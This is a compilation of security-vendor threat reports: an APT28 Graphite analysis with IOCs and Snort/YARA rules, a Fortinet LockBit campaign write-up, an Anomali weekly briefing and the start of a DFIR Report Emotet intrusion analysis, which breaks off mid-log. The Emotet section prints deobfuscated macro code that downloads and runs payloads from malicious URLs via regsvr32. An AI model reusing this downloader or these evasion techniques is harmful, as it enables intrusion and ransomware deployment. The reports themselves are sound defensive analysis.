If a new file is found, the content is downloaded and decrypted through an AES-256-CBCdecryption algorithm.
The monitoring of task executions and the uploading of their results is managed through a dedicated thread.
Finally, the malware allows remote command execution by allocating a new region of memory and executing the received shellcode by calling a new dedicated thread. 
CONCLUSIONS 
According to extracted metadata, attackers worked on the preparation of the campaign between January and February 2022.
However, both URLs used by attackers appared active even recently (Q3 2022).
In addition could be interesting to note that, according to the visibility we can dispose of, limited telemetry hits related to the collected artifacts have been catched on 25/08/2022 and 09/09/2022 from two countries of the European Union (we have no data available before 25/08/2022). 
Such recent evidence could suggest some sort of activities still ongoing linked to the described threat or to some of its variants.
Finally, based on several indicators, geopolitical objectives and the analyzed artifacts, Cluster25 attributes this campaign to the Russia-linked threat actor known as APT28 (aka Fancy Bear, TSAR Team, Pawn Storm, Sednit) and indicates entities and individuals operating in the defense and government sectors of Europe and Eastern Europe countries as potential targets. 
ATT&CK MATRIX TACTIC TECHNIQUE DESCRIPTION Initial Access T1566.001 Phishing: Spearphishing Attachment Execution T1059.001 Command and Scripting Interpreter:
PowerShell Execution T1106 Native API Execution T1204.002 User Execution: Malicious File Persistence T1546.015 Event Triggered Execution: Component Object Model Hijacking Privilege Escalation T1546.015 Event Triggered Execution: Component Object Model Hijacking Defense Evasion T1140 Deobfuscate/Decode Files or Information Defense Evasion T1202 Indirect Command Execution Defense Evasion T1036.005 Masquerading: Match Legitimate Name or Location Defense Evasion T1112 Modify Registry Defense Evasion T1027 Obfuscated Files or Information Defense Evasion T1055.001 Process Injection: Dynamic-link Library Injection Discovery T1082 System Information Discovery Command & Control T1071.001 Application Layer Protocol: Web Protocols INDICATORS OF COMPROMISE CATEGORY TYPE VALUE PAYLOAD MD5 c0060c0741833af67121390922c44f91 PAYLOAD SHA1 622eb93e34445c752eeaa623ef9ac6978e58f2fc PAYLOAD SHA256 d1bceccf5d2b900a6b601c612346fdb3fa5bb0e2faeefcac3f9c29dc1d74838d PAYLOAD MD5 ef1288de782e65d6e5bd6a327157988f PAYLOAD SHA1 a23efb6aa5a242c61c5d50a967a8f29da164c954 PAYLOAD SHA256 be180a7c43734b7125b2d5cea7edd0174811a58113b048f5fe687db52db47fe3 PAYLOAD MD5 2ff3e6c9244ef965295aa60879d1aa6b PAYLOAD SHA1 4c813ad68f2f1da6b2c59d11ad983cfa65e1a187 PAYLOAD SHA256 efa5b49bdd086125b2b7d4058d09566f1db5f183c2a6332c597322f85107667a PAYLOAD MD5 9a915313d02345e149e6ba566fe85c47 PAYLOAD SHA1 9cd7f14d85814c48be3fbf73891415978a7aa882 PAYLOAD SHA256 34aca02d3a4665f63fddb354551b5eff5a7e8877032ddda6db4f5c42452885ad NETWORK DOMAIN 9b5uja[.]am[.]files[.]1drv.com NETWORK DOMAIN kdmzlw[.]am[.]files[.]1drv[.]com NETWORK URL https[:]\\9b5uja[.]am[.]files[.]1drv[.]com/y4mpYJ245I931DUGr7BV-dwLD7SReTqFr1N7eQOKSH_ug2G18Jd6i3SRqYqgugj3FA2JQQ7JqclvWH13Br3B5Ux-F6QcqADr-FowC_9PZi1Aj7uckcK8Uix_7ja1tF6C_8-5xYgm6zwjbXsrlEcTEenAyA8BzEaGPudutl1wMDkzVr6Wmn8_qRmYejLgbNoQmPTUe3P5NKFFLRjeeU_JhvA/DSC0002.jpeg?download NETWORK URL https[:]//kdmzlw[.]am[.]files[.]1drv[.]com/y4mv4glUgvW9nl8z8GU71PhPw0oRtve9QpZ0pEgwJN1q_TlGY5yl5Mvkrc5rUh0Uxxknlr1qymWyCbPrkKOFgL4CARScSn9UMhq3c5hSNOQsDOamYLmOfN61lUtQO10vxtn0I7QROJdOtQ42wDsaiACGR5ZrmYwt0SmZkphGWQpT2gOFrsUxjg8_7QT01VTABiGr3T6xpWrTmFT5yu4toQ/DSC0001.jpeg?download" DETECTION AND THREAT HUNTING SNORT alert tcp any any -> any any (msg:"Cluster25 APT28 Graphite CnC Communication via client_id"; content:"POST"; http_method;content:"client_id=62272a08-fe9d-4825-bc65-203842ff92bc"; http_client_body; fast_pattern; sid:10001;) YARA rule Powerpoint_Code_Execution_87211_00007 {meta:author = "Cluster25"description ="Detects Code execution technique in Powerpoint (Hyperlink and Action)"hash1 = "d1bceccf5d2b900a6b601c612346fdb3fa5bb0e2faeefcac3f9c29dc1d74838d"strings:$magic = {D0 CF 11 E0 A1 B1 1A E1}$s1
= "local.lnk" fullword wide$s2 = "lmapi2.dll" fullword wide$s3 = "rundll32.exe" fullword wide$s4 = "InProcServer32" fullword wide$s5 = "DownloadData" fullword wide$s6 = "SyncAppvPublishingServer" fullword widecondition: ($magic at 0) and (all of ($s*)) and filesize < 10MB } YARA rule APT28_Graphite_62333_00028 :
RUSSIAN THREAT GROUP {meta:description = "Detects Fancy Bear Graphite variant through internal strings"author = "Cluster25"tlp = "white"hash1 = "34aca02d3a4665f63fddb354551b5eff5a7e8877032ddda6db4f5c42452885ad"strings:$ = "_LL_x64.dll" fullword ascii$ = "qqhqx!iwwU1ptzd1WngCv9BCmVtxgFTJBPR1bJ2Ze17e0N6W3VHZC2FQOOUhu4nQ2Wrj0qLEBowQ$$" ascii$ = "62272a08-fe9d-4825-bc65-203842ff92bc" fullword ascii$ = "%s %04d sp%1d.%1d %s" fullword asciicondition:uint16(0) == 0x5a4d andfilesize < 100KB andall of them} 
title: Can You See It Now?
An Emerging LockBit Campaign url: https://www.fortinet.com/blog/threat-research/emerging-lockbit-campaign FortiGuard Labs has observed a new LockBit ransomware campaign during last December and January using a combination of techniques effective against AV and EDR solutions.
LockBit has been one of the more dangerous ransomware, active since 2019.
It was part of several successful attacks against a large variety of industries, including critical infrastructure. 
This blog post discusses the infection chain and Tactics, Techniques, and Procedures (TTPs) of this campaign. 
Overview Descriptions of the attack refer to the stages outlined in Figure 1 below.
The attack starts with a .img container (1) and a social engineering technique of displaying a single file once it’s mounted while hiding the rest of its files from the user.
It can also cause malware analysts to miss the payloads while examining the samples manually. 
Figure 1: Campaign execution stages 
The user is then prompted to open the single visible shortcut (2) file. 
FIgure 2: Contents of the .img file, including the hidden files 
In some of the cases that we’ve observed, a python script is executed (2.1) using the official Python embed package.
The only purpose of the script is to run the subsequent BAT scripts.
Some variants used a known UAC bypass method abusing the legitimate fodhelper.exe (3.1).
This enables the attacker’s BAT file to run in a new elevated process without the user’s approval. 
Figure 3: UAC bypass implementation. 
The BAT script (4) does several things: 1. Changes the password of the logged-in user. 
2. Copies its files to C:\ProgramData. 
3. Ensures that after the system reboots, it logs in without user interaction (using SysInternals Autologon). 
4. Tries to - a. Set the next reboot to be in Safe Mode using bcdedit.exe. 
b. Register a new service that will run its VBS script (4.1) using sc.exe. 
c. Sets the service to run also in Safe-Mode using reg.exe. 
5. 
If it fails, it sets in the registry a BAT file (4.2) to be run on logon as another UI shell by Winlogon. 
6. Reboots the machine. 
Figure 4: Persistence of the BAT file (4.2). 
The ransomware executable resides within a password-protected archive.
The script that runs after boot executes another BAT script (4.3) to extract the ransomware payload.
It uses the 7-zip archiver and then runs it with a ‘-pass’ argument that is needed for the malicious executable to unpack itself. 
Figure 5: Command inside BAT script (4.3) decrypting and running the ransomware The final payload is LockBit.
Analysts from TrendMicro have published an analysis of the ransomware. 
Targeting focuses on Spanish-speaking victims – all samples target Mexican or Spanish firms, mainly in the consulting and law sectors. 
Ransomware note: Your data are stolen and encrypted The data will be published on TOR website if you do not pay the ransom You can contact us and decrypt one file for free on this TOR site (you should download and install TOR browser first https://torproject.org) http://<onion address> Your company id for log in: <unique id> Evasive Tradecraft The detection rate of the samples in VirusTotal was a minimal single digit, with some completely undetected, suggesting the campaign’s methods are effective in defense evasion. 
Figure 6: Detection in VirusTotal of one of the .img files. 
Delivery through a .img container bypasses the Mark of The Web (MOTW) protection mechanism.
Multi-stage scripts that extract a password-protected ransomware executable, which is unpacked only when run with a unique password, allow evading traditional signature-based detection. 
The malware authors have shown a creative and wide-ranging usage of signed, legitimate executables: the mounting of .img files by Windows Explorer, python execution by a signed interpreter, the extraction of encrypted archives by 7-zip, and automatic log-in using Sysinternals’ Autologon.
This allows for minimal reliance on custom code, trimming development costs, and staying under the radar of EDRs. 
Summary This campaign’s highly evasive nature demonstrates that attackers continue to leverage increasingly obscure methodologies to avoid detection.
This unique combination of executables wasn’t seen in previous LockBit attacks. 
These payloads may be related to the LockBit builder leak in late 2022.
Hence, a definitive attribution to the original group behind LockBit, or its affiliates, may be difficult.
Other cybercriminals would want to associate themselves with the deterrence already afforded by past acts of LockBit. 
Fortinet Solutions FortiEDR detects and blocks these threats out of the box without any prior knowledge or special configuration.
It does this using its post-execution prevention engine to identify malicious activities: Figure 7: FortiEDR blocking the ransomware. 
All network IOCs have been added to the FortiGuard WebFilter blocklist. 
FortiGuard Antivirus has coverage in place as follows: W32/Lockbit.
K!tr.ransom The FortiGuard Antivirus service engine is included in Fortinet’s FortiGate, FortiMail, FortiClient, and FortiEDR solutions. 
In addition, as part of our membership in the Cyber Threat Alliance, details of this threat were shared in real-time with other Alliance members to help create better protections for customers. 
Learn more about Fortinet’s FortiGuard Labs threat research and intelligence organization and the FortiGuard AI-powered security services portfolio.
If you think this or any other cybersecurity threat has impacted your organization, contact our Global FortiGuard Incident Response Team. 
Appendix A: MITRE ATT&CK Tactics and Techniques Tactic \ Technique ID Description TA0002 Execution T1059.003 Command and Scripting Interpreter:
Windows Command Shell T1059.005 Command and Scripting Interpreter:
Visual Basic T1059.006 Command and Scripting Interpreter: Python T1204.002 User Execution: Malicious File TA0003 Persistence T1547.004 Boot or Logon Autostart Execution: Winlogon Helper DLL T1053.005 Scheduled Task/Job: Scheduled Task T1543.003 Create or Modify System Process: Windows Service TA0005 Defense Evasion T1553.005 Subvert Trust Controls: Mark-of-the-Web Bypass T1548.002 Abuse Elevation Control Mechanism: Bypass User Account Control T1027.002 Obfuscated Files or Information: Software Packing T1562.009 Impair Defenses: Safe Mode Boot TA0040 Impact T1486 Data Encrypted for Impact T1529 System Shutdown/Reboot APPENDIX B: IoCs IMG SHA256 1ef3ae251833be08b6f3e525969ae02c28cb0238e3adb3091e572a10633f7ef7 dad61d9f919a9cc84ae633e948946e7546b21dc4d9d47d19d96fd308c7de40cb d73bcd2e29191b260a26d87c3035bde33163cc319649291db9f04c48c94da896 ee2b182a56ded459a113513985ff624631a9515c7efa2282708483ace640eb3a dca325a0028dc8e41dcf739cd00701a19066fc88c0d22be5316f7a4b7b219fe8 35bf036bf46fa21f3354d60a2c50d2959e1e9193bec8364575dc3fd4644732ae 781ead305cdb5fa0153369431dedd40fe138308fcdf5dfda1cfeaaba296752e3 1ef3ae251833be08b6f3e525969ae02c28cb0238e3adb3091e572a10633f7ef7 dad61d9f919a9cc84ae633e948946e7546b21dc4d9d47d19d96fd308c7de40cb d73bcd2e29191b260a26d87c3035bde33163cc319649291db9f04c48c94da896 ee2b182a56ded459a113513985ff624631a9515c7efa2282708483ace640eb3a dca325a0028dc8e41dcf739cd00701a19066fc88c0d22be5316f7a4b7b219fe8 35bf036bf46fa21f3354d60a2c50d2959e1e9193bec8364575dc3fd4644732ae 781ead305cdb5fa0153369431dedd40fe138308fcdf5dfda1cfeaaba296752e3 1858a862390adcaa4cea6782e7dba077697475ff9ada9d75c4897ccd563998af Ransomware Executables SHA256 Name cb049c6e59106bbdfd804a9d02bb31ea09a3918018cbb97fb12d2bcf9e475465 documentos.exe 334148a7434f4fd27dcc6600edc2f29e4f11ada0be9f71f807cbd4154abd74be documentos.exe fd3577ff36496320485ffa05681ffa516a56fc4818c3fc89774aa4bb20e2c17f documentos.exe 8465c979990e75262d15e93453287d6107f008035d6d6a05bd3a92c2e3fe1d40 HacAK.exe 40828437094a02ab467a0c0343d08c110d3b0c2972b609bcdd355667614209f EMJgp.exe 50f49ac742a127085e0a824bcae7e25326ea0ef0741f0abe34ce494f2c4ef4d2 byhHI.exe cc58dcd32a440e7f95d19b653a55c1e2c383efc2bd19443238dd3008c1cbe147 bOpDX.exe 6eb6431dcfb1e7105fb05e2d8b01e231f6d4b82a1df3639499d0adacd00757cc gVozH.exe Domains poliovocalist[.]com IPs 198.244.187[.]248 150.129.218[.]231 LockBit Portal URLs hxxp://lockbit3jx6je7tm6hhm6zzafgy6hpil3ur6jmc2a4ugan7xzztv6oqd[.]onion hxxp://lockbitdvbpfczc3yrs37kpp6avnrgr7yygi2f45qxvef2yqi36lpxyd[.]onion hxxp://lockbit3hc6syym13ki2ag5jskr6q5qa3spspjpmtfhh6fufut737zid[.]onion hxxp://lockbitov3afmxgknfhk2o5d4uqrhygd7ty3xqm56qd6zjlu6u43pgyd[.]onion 
title: WTB:
Remote Mac Exploitation Via Custom URL Schemes url: https://www.anomali.com/blog/wtb-remote-mac-exploitation-via-custom-url-schemes The intelligence in this week’s iteration discuss the following threats: Anonymous, Apache Struts vulnerability, BusyGasper, Cobalt Gang, DarkComet, DDoS, Loki Bot, Spear phishing, and WINDSHIFT APT.
The IOCs related to these stories are attached to the Community Threat Briefing and can be used to check your logs for potential malicious activity. 
Trending Threats Remote Mac Exploitation Via Custom URL Schemes (August 30, 2018) 
An obscure Advanced Persistent Threat (APT) called WINDSHIFT has been seen exploiting a flaw in macOS to target government institutions in the Middle East in what appears to be the 1st-stage of a 2nd-stage cyber campaign.
This 1st-stage attack is intended to gain initial access into a fully patched macOS system to pave the way for the 2nd-stage attack in the future.
The malware exploits custom URL schemes in the Safari browser to remotely infect macOS targets.
This requires a minimal amount of user interaction, but this can be "influenced" by the APT group as needed.
This 1st-stage attack takes advantage of the way macOS registers document handlers and custom URL schemes to automatically unzip a malicious attachment sent via phishing emails in the Safari browser.
Once the attachment is automatically unzipped, a malicious application in the attachment is in the filesystem and triggers the registration of a custom URL scheme handler.
The malware can then load the custom URL on the user’s computer so the threat actor can then have access to a system. 
Click here for Anomali recommendation MITRE ATT&CK: 
[MITRE ATT&CK] Launch Daemon (T1160) 
Double The Infection, Double The Fun (August 30, 2018) 
The threat group, Cobalt Gang (also known as TEMP.Metastrike), is suspected to be engaging in attacks against financial organizations in several countries.
Researchers at ASERT have observed a new campaign targeting institutions in Romania and Russia utilizing spear phishing emails pretending to be from financial vendors or partners to trick users into opening the malicious attachments in the emails.
The malicious attachments are either a Word document that contains obfuscated VBA scripts or a binary with a JPG extension.
Both send information to command and control (C2) servers that are owned by Cobalt Group. 
Click here for Anomali recommendation MITRE ATT&CK: 
[MITRE ATT&CK] CMSTP (T1191) |
[MITRE ATT&CK]
Spearphishing Attachment (T1193) Cryptojackers Exploit Critical Apache Struts Flaw (August 30, 2018) Security experts from Volexity have recently seen a critical Apache Strut vulnerability being exploited in the wild to install a popular cryptocurrency miner on targeted machines.
The vulnerability, which is known as CVE-2018-11776, comes from an improper validation of namespace input data, and threat actors have already exploited this to install a CNRig cryptocurrency miner on machines. 
[MITRE ATT&CK] Third-party Software (T1072) Anonymous Catalonia Claims DDoS Attack On Bank of Spain Website (August 30, 2018) 
The hacktivist group, Anonymous Catalonia claimed a Distributed Denial of Service (DDoS) attack on Banco de España which forced the bank’s website to be offline and unusable for two days.
The group claimed the attack via Twitter using the hashtag “TangoDown” to indicate the bank’s hosting server was down globally.
The hacktivist group targeted the bank, amongst others, to protest the arrests of Catalan leaders who took part in the illegal Independence referendum last year.
Banco de España stated that while their website was down, none of their normal functionalities were impacted.
This is a continuation of attacks on various Spanish legal entities following the unsuccessful referendum last year and the so-called “hurting of Catalan people” that this group claims the government is responsible for. 
Click here for Anomali recommendation Air Canada Resets 1.7 Million Accounts After App Breach (August 30, 2018) Air Canada issued password resets to over 1.7 million customers using its mobile application following a data breach that affected 20,000 accounts.
Unusual login behavior was detected between August 22 and 24, 2018, and the airline proceeded to block further access.
The data compromised includes: names, email addresses, telephone numbers, and Air Canada Aeroplan account numbers.
The other data compromised in this breach, which is more worrying, includes passport numbers, NEXUS numbers (allows for quicker access over some borders), traveler numbers, gender, date of birth, nationality, passport expiry date, country of issuance, and country of residence.
The airline reports that credit card numbers were encrypted and thus safe from the breach. 
Click here for Anomali recommendation BusyGasper – The Unfriendly Spy (August 29, 2018) Security researchers from Kaspersky Lab uncovered a new family of spyware, dubbed “BusyGasper,” that targets Android devices.
Whilst the malware is not too sophisticated, it does have a broad range of commands that it can do, including keylogging every tap, exfiltrate data from messaging applications such as WhatsApp and Viber, and bypasses the Doze battery saver.
The malware can deliver payloads from the command and control (C2) server which originates from a free Russian web hosting service called Ucoz.
This malware is more unusual than most because it appears that the initial attack vector requires the threat actor to physically install the malware on the target’s device, meaning the threat actor needs to actually get a hold of the device somehow.
Due to the close physical proximity to the target device, researchers have only seen fewer than ten victims and they are all located within Russia.
Despite the threat actors gaining access to the victim’s bank account information, it does not appear that the intent of the attack is financially-driven. 
[MITRE ATT&CK] Custom Command and Control Protocol (T1094) Loki Bot: On A Hunt For Corporate Passwords (August 29, 2018) 
Researchers from Kaspersky Labs have discovered a malspam campaign pushing the Loki Bot malware through phishing emails.
The emails have targeted corporate businesses using three possible types of messages to try to get a target to open the email and malicious attachment.
The threat actors either created fake emails from real companies (usually related to money payments/invoices or shipping statements), fake emails containing financial documents to be looked at, or fake emails containing false order statements or offers for providing services.
If a target opens the malicious attachment, the Loki Bot malware then can assist in the threat actors gaining access to intellectual property, databases, bank account information, system credentials and more. 
Spearphishing Attachment (T1193) Microsoft Windows Zero-Day Vulnerability Is Disclosed On Twitter (August 29, 2018) 
A Twitter user named “SandboxEscaper” disclosed a zero-day vulnerability in Microsoft Windows.
This vulnerability escalates a flaw in the operating system’s task scheduler’s Advanced Local Procedure Call (ALPC).
This vulnerability allows for a threat actor to obtain system privileges and currently has no known workarounds for the vulnerability.
Microsoft released a statement that it will release a patch for it next month.
SandboxEscaper attempted to sell the vulnerability on Reddit, but the posts were removed, though it is unclear whether a sale was made before the removal of the posts. 
[MITRE ATT&CK] Exploitation for Privilege Escalation (T1068) 
We're All Sick Of Fortnite, But The Flaw Found In Its Downloader Is The Latest Way To Attack Android (August 29, 2018) 
The Android version of popular game, Fortnite, has been discovered to contain a vulnerability that could allow for a “man-in-the-disk” attack.
This type of attack works by using the ability to read/write data to external storage to gain access to files in the external storage and modify them with malicious data.
For the Android version of Fortnite, users are required to download the game through a helper application which is then supposed to download the game file for the device.
A threat actor can use “man-in-the-disk” to get the user to download a malicious “helper application” instead, allowing the threat actor access to the device. 
[MITRE ATT&CK] Replication Through Removable Media (T1091) |
[MITRE ATT&CK] Hardware Additions (T1200) Beware Of Fake "Shipping Docs"
Malspam Pushing The DarkComet RAT (August 28, 2018) 
Security researcher Vishal Thakur has discovered a malware campaign that sends emails pretending to be related to a shipment notice for the target which contain a malicious attachment.
The attachment appears as shipping document that is awaiting to be opened, read through, and approved by the target.
The attachment appears as a .z file and will install the DarkComet RAT.
The attachment, if opened, contains a DarkComet Remote Access Trojan (RAT).
DarkComet then allows for threat actors to obtain logs of the infected machine’s keystrokes, application use, and take screenshots, amongst other things. 
Remote Access Tools (T1219) CeidPageLock: A Chinese RootKit (August 28, 2018) 
A new version of the browser-hijacking rootkit called “CEIDPageLock” has been found being distributed by the RIG Exploit kit by Check Point researchers.
CEIDPageLock attempts to manipulate a user’s browser and turn their homepage to a Chinese web directory, 2435.com.
This new version of the malware monitors user’s browsing data and replaces the content of popular Chinese sites with the fake homepage of 2345.com.
Threat actors can then monitor what sites victims go to and how long they are on each website to potentially lead targeted advertisement campaigns or sell that information to other companies.
Most of the victims originated in China, however, other victims located in the UK, Taiwan, Hong Kong, the US, Denmark, and Japan were also observed.
CEIDPageLock is most likely distributed via the RIG’s landing page which exploits a browser vulnerability to gain code execution.
From there, the malware dropper is downloaded then extracts the driver from within itself and saves it in the “\\Windows\\Temp” directory with the filename “houzi.sys.”
The dropper then starts the malicious 32-bit driver that connects to the command and control (C2) hard-coded domains to download the specific 2345.com homepage configuration.
This version of CEIDPageLock has VMProtect, which makes analysis and unpacking difficult and also redirects victims to the specific homepage when they attempt to access specific Chinese websites. 
[MITRE ATT&CK] Rootkit (T1014) |
[MITRE ATT&CK] Kernel Modules and Extensions (T1215) |
[MITRE ATT&CK] Hooking (T1179) 
Abbyy Leaked 203,000 Sensitive Customer Documents In Server Lapse (August 27, 2018) 
The maker of an optical recognition software, Abbyy, suffered a breach of sensitive customer data because of a database server that was left unsecured without a password on the Internet.
The company’s MongoDB server was misconfigured in such a way that allowed for over 203,000 sensitive documents dating back to 2012 up to the present to be publicly accessible.
The server was taken offline after it was privately disclosed within the company.
According to the company, the breach only affected one customer and files involving commercial information and that customer has been notified, as well as Abbyy has taken corrective measures to the problem.
They have not released information regarding if unauthorized users had accessed the database while it was public. 
Click here for Anomali recommendation Observed Threats This section includes the top threats observed from the Anomali Community user base as well as sensors deployed by Anomali Labs. 
A ThreatStream account is required to view this section. 
Click here to request a trial. 
Additional information regarding the threats discussed in this week’s Community Threat Briefing can be found below: Spear Phishing Spear phishing is a tactic in which a threat actor targets a specific business, individual, or organization via email or another form of electronic communication while tricking the recipient into thinking the email originated from an authentic source.
The objective of spear phishing is to gain an initial infection vector within a particular company’s or individual’s network.
Threat actors will attempt to make the communication appear to originate from a source that the recipient would be familiar with and/or deem trustworthy.
Spear phishing is used by all levels of threat actors, including Advanced Persistent Threat (APT) groups. 
title: Dead or Alive?
An Emotet Story url: https://thedfirreport.com/2022/09/12/dead-or-alive-an-emotet-story/ In this intrusion from May 2022, we observed a domain-wide compromise that started from a malware ridden Excel document containing the never-dying malware, Emotet. 
The post-exploitation started very soon after the initial compromise.
The threat actors began enumerating the network once Emotet deployed a Cobalt Strike beacon on the beachhead host.
After three days of discovery and lateral movement, the threat actors exfiltrated sensitive data using Rclone before leaving the network. 
After a successful takedown thanks to Interpol and Eurojust efforts, Emotet was resurrected in November 2021 with the help of Trickbot malware.
Since then, Emotet has been testing different initial access payloads while its developers were busy improving the core functionality of the actual malware.
Since January 2022 we observed an increase in the activity of Cobalt Strike deployments following Emotet intrusions. 
In a few weeks, we’ll have another Emotet report out from June, where the intrusion used similar TTPs and ended in ransomware. 
Case Summary Back in May, we witnessed an intrusion that started from a phishing email which included Emotet.
The intrusion lasted four days and contained many of the usual suspects, including the Cobalt Strike post-exploitation framework. 
The Emotet infection was delivered using a xls file containing a malicious macro, a technique that has been on the wane in recent months.
After executing the Emotet malware, it ran a few basic Windows discovery commands (systeminfo, ipconfig, etc.), wrote a registry run key for persistence, and made its initial call outs to the command and control servers. 
Around 40 minutes after the initial execution, the Emotet malware started to run a new Emotet email spreader campaign.
This entailed connecting to various email servers and sending new emails with attached xls and zip files.
This activity continued until the UTC clock turned over to the next day; at which point, the email spreader halted for a period of time and around seven hours into the second day, it began running the email spreader again. 
Around 26 hours after the initial infection, while still running the email spreader, the Emotet malware pulled down and executed a Cobalt Strike payload on the beachhead host.
Right after the beacon was executed, the threat actors began enumerating the network using native Windows binaries and the PowerView module, Invoke-ShareFinder.
Around 30 minutes after dropping the beacon the threat actor injected into a dllhost.exe process and then proceeded to dump credentials from LSASS.
Another 20 minutes later, the threat actor ran Invoke-ShareFinder again and Invoke-Kerberoast. 
At 29 hours from initial access, the threat actors began their first lateral movement.
This was achieved by transferring a Cobalt Strike DLL over SMB and executing via a remote service on another workstation.
From there, they ran Invoke-Sharefinder once again, along with AdFind, using a batch file named find.bat.
Pass-the-Hash behavior was observed targeting several accounts on the lateral host.
Use of Cobalt Strike’s Get-System module was also apparent via the logs. 
The threat actors then proceeded to do additional network discovery using a batch script named p.bat to ping all servers in the network.
More account discovery was then observed, with queries for Domain Administrators and a backup account. 
At 31 hours into the intrusion, the threat actors pivoted to the Domain Controller using the same Cobalt Strike DLL.
Once on the Domain Controller, the threat actors again used Get-System to elevate and then dumped LSASS.
After completing that activity, the threat actors chose another server to push a file, 1.msi, to, which was the installation package for Atera–for an additional means of persistence and command and control.
During this whole second day, the original Emotet infection on the beachhead host was still trying to send more malicious emails, finally stopping for the day a little before 23:00 UTC. 
They returned the next day, at the same time as the previous day, and picked up where they left off.
They pivoted to a couple of workstations on the network using Cobalt Strike and installed Atera and Splashtop with a different MSI installer.
Once again, they executed Invoke-Sharefinder, AdFind, and the p.bat batch script to ping online servers.
Using the remote admin tools, they used Rclone to exfiltrate important data from a file server and upload it to MEGA.
Interestingly, the threat actors exfiltrated the same data twice while running Rclone with the parameter –ignore-existing from two different hosts on the network.
Around 20:00 UTC the Emotet infection on the beachhead host began its email spreader activity again, only to halt at the change over at 00:00 UTC. 
On the last day of this intrusion, the threat actors returned during their normal working hours and used Rclone to exfiltrate IT-related data from a separate server.
This was the last activity we observed from this group.
These cases commonly end up with ransomware in addition to data exfiltration.
This, however, was not the case with this intrusion as the threat actors were evicted before any final actions could be taken. 
Services We offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as Cobalt Strike, BumbleBee, Covenant, Metasploit, Empire, PoshC2, etc.
More information on this service and others can be found here. 
We also have artifacts and IOCs available from this case such as pcaps, memory captures, files, event logs including Sysmon, Kape packages, and more, under our Security Researcher and Organization services. 
Timeline Analysis and reporting completed by @Kostastsale and @IcsNick Initial Access 
The threat actor gained access to the environment after a user opened an Excel document and enabled macros.
The document came in via email in the form of a zip file which included an xls file.
Thanks for sharing @proxylife! 
The document contains hidden sheets, has white characters on a white background, and is attributed to SilentBuilder with Emotet, epoch5. 
To deobfuscate the document the tool xlmdeobfuscator was used with the following output. 
After deobfuscation and cleaned up, the code in the macro looks as follows. 
=CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"http[:]//praachichemfood[.]com/wp-content/Mwmos/","..\hvxda.ocx",0,0) =IF(JRSJG1<0,CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"https[:]//lopespublicidade[.]com/cgi-bin/e5R5oG4iEaQnxQrZDh/","..\hvxda.ocx",0,0)) =IF(JRSJG2<0,CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"https[:]//bosny[.]com/aspnet_client/rnMp0ofR/","..\hvxda.ocx",0,0)) =IF(JRSJG3<0,CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"http[:]//seasidesolutions[.]com/cgi-bin/WLoO6sEzYCJ3LTlC/","..\hvxda.ocx",0,0)) 
=IF(JRSJG4<0,CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"http[:]//borgelin[.]org/belzebub/okwRWz1C/","..\hvxda.ocx",0,0)) 
=IF(JRSJG5<0, CALL("urlmon","URLDownloadToFileA","JJCCBB",0,"http[:]//loa-hk[.]com/wp-content/ffBag/","..\hvxda.ocx",0,0)) =IF(JRSJG6<0, CLOSE(0),) =EXEC("C:\Windows\System32\regsvr32.exe ..\hvxda.ocx") =R Execution Emotet Execution The execution is done from an Excel document using regsvr32.exe with the payload, hvxda.ocx, that is a DLL file with the name of random characters, llJyMIOvft.dll .
Worth noting, the Excel document failed to download the second payload from a few of the embedded URLs. 
A new file is then created in C:\%USERPROFILE%\AppData\Local\ with a folder that also consists of random characters. 
Cobalt Strike Execution The Emotet DLL is then used to download Cobalt Strike, which is then injected into svchost and dllhost. 
Sysmon showing Emotet starting the Cobalt Strike executable. 
A great way to get the Malleable profile (and additional beacon config), is to use Didier Stevens’s fantastic tool 1768.py.
Here, the tool is used with a process dump of the executable. 
Persistence The Emotet malware infection on the beachhead host used a registry run key to maintain persistence. 
This registry key activity (Sysmon EventID 12 & 13) was observed continuously on the beachhead host for the first few days of the intrusion. 
Beyond the beachhead host, the threat actor deployed several Atera/Splashtop remote access tools across the environment as an alternative means of access to the environment should they lose access to their Cobalt Strike beacons. 
Privilege Escalation Use of Cobalt Strike’s Get-System named pipe technique was observed on the Domain Controller and other hosts to elevate to System privileges. 
Defense Evasion Process injection was observed during the intrusion by both Emotet and Cobalt Strike.
Emotet injected multiple times into svchost to execute certain functions, including discovery commands. 
Cobalt Strike used process hollowing to launch under the context of the Dllhost.exe process.
We later saw Dllhost.exe injecting into multiple other processes, such as explorer.exe and svchost.exe, to execute further payloads. 
Scanning process memory across affected hosts reveals both the direct Cobalt Strike processes and the injected processes using the Malpedia yara rule. 
.Pid .ProcessName .CommandLine .Rule 4616 svchost.exe C:\Windows\system32\svchost.exe -k UnistackSvcGroup -s
CDPUserSvc win_cobalt_strike_auto 4844 svchost.exe C:\Windows\system32\svchost.exe -k UnistackSvcGroup -s
WpnUserService win_cobalt_strike_auto 10256 UOmCgbXygCe.exe “C:\Users\USER\AppData\Local\FrlxbduRbdVAbVbS\UOmCgbXygCe.exe” win_cobalt_strike_auto 836 svchost.exe C:\Windows\system32\svchost.exe -k DcomLaunch -p win_cobalt_strike_auto 1008 svchost.exe C:\Windows\system32\svchost.exe -k DcomLaunch -p
-s LSM win_cobalt_strike_auto 9308 regsvr32.exe regsvr32 C:\ProgramData\1.dll win_cobalt_strike_auto 1056 svchost.exe C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p win_cobalt_strike_auto 1428 svchost.exe C:\Windows\system32\svchost.exe -k ICService -p win_cobalt_strike_auto 6036 regsvr32.exe regsvr32 C:\ProgramData\1.dll win_cobalt_strike_auto Credential Access From the beachhead host credentials appear to have been dumped from an injection into the SearchIndexer process on the host.
Data observed using sysmon event id 10 shows the use of the SearchIndexer process, similar to behavior observed in a prior case, followed by known Cobalt Strike malleable profile named pipes. 
EventID: 10 SourceImage: C:\Windows\system32\SearchIndexer.exe TargetImage: C:\Windows\system32\lsass.exe GrantedAccess: 136208 CallTrace: C:\Windows\SYSTEM32\ntdll.dll+9d1e4|C:\Windows\System32\KERNELBASE.dll+2bcbe|C:\Program Files\Common Files\Microsoft
Shared\Ink\IpsPlugin.dll+10369|C:\Program Files\Common Files\Microsoft
Shared\Ink\IpsPlugin.dll+10b65|C:\Program Files\Common Files\Microsoft
Shared\Ink\IpsPlugin.dll+8cb2|C:\Program
